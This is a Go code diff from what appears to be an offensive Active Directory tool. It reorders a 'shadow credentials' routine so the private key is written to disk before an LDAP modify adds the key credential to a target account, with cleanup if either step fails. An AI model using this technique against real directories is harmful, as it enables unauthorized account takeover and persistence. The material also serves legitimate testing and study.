@@ -47,18 +47,32 @@ Examples:
 		}
 
 		if doAdd {
-			entry, err := pki.AddShadowCredential(cfg, target)
+			// Generate the key credential first (no LDAP yet)
+			entry, err := pki.GenerateKeyCredential()
 			if err != nil {
-				return err
+				return fmt.Errorf("generate key credential: %w", err)
 			}
-			// Write private key to file
+
+			// Write private key to disk BEFORE LDAP modify — if this fails, nothing
+			// is orphaned in AD. If LDAP modify later fails, we clean up the file.
 			keyPath := fmt.Sprintf("shadow_%s.key", entry.DeviceID[:8])
 			keyFile, err := os.Create(keyPath)
 			if err != nil {
 				return fmt.Errorf("write key file: %w", err)
 			}
-			defer keyFile.Close()
-			pki.WriteECPrivateKey(keyFile, entry.PrivateKey)
+			if err := pki.WriteECPrivateKey(keyFile, entry.PrivateKey); err != nil {
+				keyFile.Close()
+				os.Remove(keyPath)
+				return fmt.Errorf("write key: %w", err)
+			}
+			keyFile.Close()
+
+			// Now perform the LDAP modify to add the shadow credential
+			if _, err := pki.AddShadowCredentialWithEntry(cfg, target, entry); err != nil {
+				os.Remove(keyPath) // clean up key file on LDAP failure
+				return err
+			}
+
 			fmt.Printf("[+] Private key written to: %s\n", keyPath)
 			return nil
 		}
